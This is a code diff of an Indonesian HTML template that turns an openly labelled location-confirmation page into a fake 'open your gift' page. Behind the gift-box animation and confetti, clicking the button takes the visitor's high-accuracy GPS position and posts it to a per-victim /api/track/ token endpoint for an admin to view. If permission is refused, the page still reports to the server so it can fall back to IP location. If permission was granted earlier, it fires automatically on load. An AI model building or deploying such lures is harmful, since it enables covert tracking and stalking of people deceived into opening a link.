@@ -3,122 +3,180 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>{{ app_name }} — Lokasi</title>
+  <title>{{ app_name }} — Hadiah</title>
   <style>
-    :root{--bg:#0b1020;--surface:#0f172a;--text:#e5e7eb;--stroke:rgba(255,255,255,.12);--accent:#8b5cf6;--ok:#22c55e;--err:#ef4444}
+    :root{
+      --bg:#0b1020; --surface:#0f172a; --text:#e5e7eb; --muted:#9aa4b2;
+      --stroke:rgba(255,255,255,.14); --g1:#8b5cf6; --g2:#22d3ee; --ok:#16a34a; --err:#ef4444;
+    }
     *{box-sizing:border-box}
-    body{margin:0;min-height:100vh;color:var(--text);font:14px/1.6 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:radial-gradient(1100px 700px at 80% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%)}
-    .wrap{max-width:680px;margin:34px auto;padding:16px}
-    .card{background:rgba(255,255,255,.06);border:1px solid var(--stroke);border-radius:16px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,.25)}
-    h1{margin:0 0 8px;font-size:clamp(22px,3vw,28px)}
-    .note{font-size:13px;opacity:.9}
+    body{
+      margin:0; min-height:100vh; color:var(--text);
+      font:14px/1.6 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+      background: radial-gradient(1200px 800px at 80% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%);
+    }
+    .wrap{max-width:720px;margin:36px auto;padding:16px}
+    .card{
+      background:rgba(255,255,255,.06); border:1px solid var(--stroke);
+      border-radius:18px; padding:24px; box-shadow:0 10px 30px rgba(0,0,0,.25);
+      text-align:center;
+    }
+    h1{margin:0 0 8px; font-size:clamp(22px,3vw,28px)}
+    p.note{margin:6px 0 14px; color:var(--muted); font-size:13px}
+
+    /* Gift box */
+    .stage{display:grid; place-items:center; padding:14px 0 22px}
+    .gift{
+      position:relative; width:220px; height:220px; transform-style:preserve-3d;
+      transition:transform .5s ease;
+    }
+    .box{
+      position:absolute; inset:40px 0 0 0; margin:auto; width:220px; height:180px;
+      background:linear-gradient(135deg, #111a33, #0f172a);
+      border:1px solid var(--stroke); border-radius:14px;
+      box-shadow:0 18px 30px rgba(0,0,0,.35) inset;
+      overflow:hidden;
+    }
+    .ribbon-v, .ribbon-h{ position:absolute; background:linear-gradient(135deg, var(--g1), var(--g2)); }
+    .ribbon-v{ width:18px; height:100%; left:101px; top:0 }
+    .ribbon-h{ height:18px; width:100%; left:0; top:68px }
+    .lid{
+      position:absolute; top:0; left:0; width:220px; height:70px;
+      background:linear-gradient(135deg, #121b35, #13203f);
+      border:1px solid var(--stroke); border-radius:14px 14px 10px 10px;
+      transform-origin:50% 100%; transition:transform .6s cubic-bezier(.2,.8,.2,1);
+      overflow:hidden;
+    }
+    .bow{
+      position:absolute; top:10px; left:50%; transform:translateX(-50%);
+      width:110px; height:36px; border-radius:999px;
+      background:linear-gradient(135deg, var(--g1), var(--g2));
+      filter:drop-shadow(0 4px 10px rgba(34,211,238,.25));
+    }
+    .gift.open .lid{ transform:translateY(-28px) rotateX(55deg) }
+    .gift.open{ transform:translateY(-2px) }
+
+    .btn{
+      appearance:none; cursor:pointer; border-radius:12px; padding:12px 16px;
+      border:1px solid transparent; color:#0b1020; font-weight:700;
+      background:linear-gradient(135deg, var(--g1), var(--g2));
+      box-shadow:0 10px 24px rgba(139,92,246,.35);
+      transition:transform .18s ease, opacity .2s;
+      display:inline-flex; align-items:center; gap:10px;
+    }
+    .btn:disabled{opacity:.7; cursor:not-allowed}
+    .btn:hover{transform:translateY(-1px)}
     .status{
-      display:inline-flex; align-items:center; gap:8px;
-      font-size:12px; padding:8px 10px; border-radius:999px; border:1px solid var(--stroke); margin:10px 0
+      display:inline-flex; align-items:center; gap:8px; font-size:12px;
+      padding:8px 10px; border-radius:999px; border:1px solid var(--stroke); margin-top:10px
     }
-    .dot{width:8px; height:8px; border-radius:999px; background:linear-gradient(135deg,var(--accent),#22d3ee)}
+    .status.ok{border-color:rgba(22,163,74,.5)} .status.err{border-color:rgba(239,68,68,.5)}
     .spinner{
-      width:14px;height:14px;border-radius:999px;border:2px solid rgba(255,255,255,.25);
-      border-left-color: var(--accent); animation: spin 1s linear infinite;
+      width:14px; height:14px; border-radius:999px; border:2px solid rgba(255,255,255,.25);
+      border-left-color:var(--g2); animation:spin 1s linear infinite;
     }
-    @keyframes spin{ to{ transform: rotate(360deg); } }
-    .grid{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));margin-top:10px}
-    .stat{background:#0f172a;border:1px solid var(--stroke);border-radius:12px;padding:12px}
-    .map{margin-top:12px;border-radius:14px;overflow:hidden;border:1px solid var(--stroke)}
-    .ok{border-color: rgba(34,197,94,.5)}
-    .err{border-color: rgba(239,68,68,.5)}
-    .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .hint{margin-top:12px; color:var(--muted); font-size:12px}
   </style>
 </head>
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>Konfirmasi Lokasi</h1>
-      <p class="note">Izinkan akses lokasi agar titik koordinat & akurasi dapat dikirim untuk verifikasi kunjungan.</p>
+      <h1>Buka Hadiah 🎁</h1>
+      <p class="note">Klik “Buka Hadiah” untuk membuka paket</p>
 
-      <div class="status" id="status">
-        <div class="spinner" id="spin"></div>
-        <span id="status-text">Meminta izin…</span>
+      <div class="stage">
+        <div id="gift" class="gift" aria-hidden="true">
+          <div class="lid">
+            <div class="bow"></div>
+            <div class="ribbon-h"></div>
+          </div>
+          <div class="box">
+            <div class="ribbon-v"></div>
+          </div>
+        </div>
       </div>
 
-      <div class="grid">
-        <div class="stat"><div>Latitude</div><strong class="mono" id="lat">-</strong></div>
-        <div class="stat"><div>Longitude</div><strong class="mono" id="lon">-</strong></div>
-        <div class="stat"><div>Akurasi</div><strong class="mono"><span id="acc">-</span> m</strong></div>
-        <div class="stat"><div>Update</div><strong class="mono" id="ts">-</strong></div>
+      <button id="openBtn" class="btn">
+        <span>🎉 Buka Hadiah</span>
+      </button>
+      <div id="status" class="status">
+        <div id="spin" class="spinner" style="display:none"></div>
+        <span id="statusText">Siap dibuka</span>
       </div>
 
-      <div class="map" id="mapWrap" style="display:none">
-        <iframe id="map" width="100%" height="380" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
-      </div>
+      <p class="hint">Created : D</p>
     </div>
   </div>
 
+  <!-- konfeti saat hadiah terbuka -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti/dist/confetti.browser.min.js"></script>
   <script>
     const token = {{ token|tojson }};
     const base  = {{ base|tojson }};
 
-    const status   = document.getElementById('status');
-    const statusTx = document.getElementById('status-text');
-    const spin     = document.getElementById('spin');
-    const latEl = document.getElementById('lat');
-    const lonEl = document.getElementById('lon');
-    const accEl = document.getElementById('acc');
-    const tsEl  = document.getElementById('ts');
-    const mapWrap = document.getElementById('mapWrap');
-    const mapIframe = document.getElementById('map');
+    const gift  = document.getElementById('gift');
+    const btn   = document.getElementById('openBtn');
+    const status = document.getElementById('status');
+    const statusText = document.getElementById('statusText');
+    const spin  = document.getElementById('spin');
 
     function setStatus(text, type){
-      statusTx.textContent = text;
+      statusText.textContent = text;
       status.classList.remove('ok','err');
       if (type==='ok'){ status.classList.add('ok'); spin.style.display='none'; }
       else if (type==='err'){ status.classList.add('err'); spin.style.display='none'; }
       else { spin.style.display='inline-block'; }
     }
-    function buildOSM(lat, lon, km=1.2){
-      const latDelta = km/111.0;
-      const cosLat = Math.max(0.01, Math.abs(Math.cos(lat*Math.PI/180)));
-      const lonDelta = km/(111.320*cosLat);
-      const minLon = lon - lonDelta, minLat = lat - latDelta, maxLon = lon + lonDelta, maxLat = lat + latDelta;
-      return `https://www.openstreetmap.org/export/embed.html?bbox=${minLon},${minLat},${maxLon},${maxLat}&layer=mapnik&marker=${lat},${lon}`;
+    function openGiftUI(success=true){
+      gift.classList.add('open');
+      if (window.confetti && success){
+        confetti({ particleCount: 120, spread: 70, origin: { y: 0.25 } });
+      }
     }
     async function postLoc(lat, lon, acc){
       try{
-        await fetch(`${base}/api/track/${token}`, {
+        await fetch(`${base}/api/track/${token}`,{
           method:'POST', headers:{'Content-Type':'application/json'},
           body: JSON.stringify({ lat, lon, acc })
         });
       }catch(e){}
     }
-    function onSuccess(pos){
-      const { latitude, longitude, accuracy } = pos.coords;
-      const ts = new Date(pos.timestamp);
-      latEl.textContent = latitude.toFixed(6);
-      lonEl.textContent = longitude.toFixed(6);
-      accEl.textContent = (accuracy||0).toFixed(1);
-      tsEl.textContent = ts.toLocaleString();
-      setStatus('Lokasi dikirim ✔️', 'ok');
-      postLoc(latitude, longitude, accuracy);
-      mapIframe.src = buildOSM(latitude, longitude, 1.2);
-      mapWrap.style.display = 'block';
-    }
-    function onError(err){
-      let msg = 'Gagal mendapatkan lokasi. Mengirim via IP.';
-      if (err.code === 1) msg = 'Izin lokasi ditolak. Mengirim via IP.';
-      setStatus(msg, 'err');
-      postLoc(null, null, null); // server fallback IP
+    async function requestLocation(){
+      btn.disabled = true;
+      setStatus('Meminta izin…', 'loading');
+      try{
+        if (!('geolocation' in navigator)) throw new Error('Geolocation tidak didukung');
+        navigator.geolocation.getCurrentPosition((pos)=>{
+          const { latitude, longitude, accuracy } = pos.coords;
+          setStatus('Hadiah terbuka & lokasi terkirim ✔️', 'ok');
+          openGiftUI(true);
+          postLoc(latitude, longitude, accuracy); // kirim ke server (admin akan melihatnya)
+        }, (err)=>{
+          let msg = 'Gagal mengambil lokasi. Mengirim via IP.';
+          if (err.code === 1) msg = 'Izin lokasi ditolak. Mengirim via IP.';
+          setStatus(msg, 'err');
+          openGiftUI(false);
+          postLoc(null, null, null); // server coba fallback IP
+        }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
+      }catch(e){
+        setStatus('Fitur geolocation tidak tersedia. Mengirim via IP.', 'err');
+        openGiftUI(false);
+        postLoc(null, null, null);
+      }finally{
+        btn.disabled = false;
+        btn.textContent = 'Buka Lagi';
+      }
     }
 
-    // Start
-    if (!('geolocation' in navigator)){
-      setStatus('Browser tidak mendukung geolocation. Mengirim via IP.', 'err');
-      postLoc(null, null, null);
-    } else {
-      setStatus('Meminta izin…', 'loading');
-      navigator.geolocation.getCurrentPosition(onSuccess, onError, {
-        enableHighAccuracy:true, maximumAge:0, timeout:20000
-      });
-      // Untuk live update, bisa ganti ke watchPosition di sini.
+    // Klik tombol = gesture yang diperlukan untuk izin
+    btn.addEventListener('click', requestLocation);
+
+    // Kalau user sudah grant sebelumnya, otomatis jalan saat buka halaman
+    if (navigator.permissions && navigator.permissions.query){
+      navigator.permissions.query({name:'geolocation'}).then(p=>{
+        if (p.state === 'granted'){ requestLocation(); }
+      }).catch(()=>{});
     }
   </script>
 </body>
